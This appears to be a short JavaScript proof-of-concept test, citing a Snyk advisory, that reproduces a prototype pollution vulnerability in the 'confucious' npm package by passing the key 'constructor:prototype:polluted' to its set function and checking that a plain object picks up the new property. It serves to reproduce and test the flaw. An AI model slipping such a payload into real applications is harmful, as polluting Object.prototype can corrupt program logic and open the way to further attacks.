// //https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
// test("prototype pollution in confucious", () => {
console.log({}.polluted);

  const confucious = require("confucious");
  confucious.set("constructor:prototype:polluted", "yes");

console.log({}.polluted);
// });
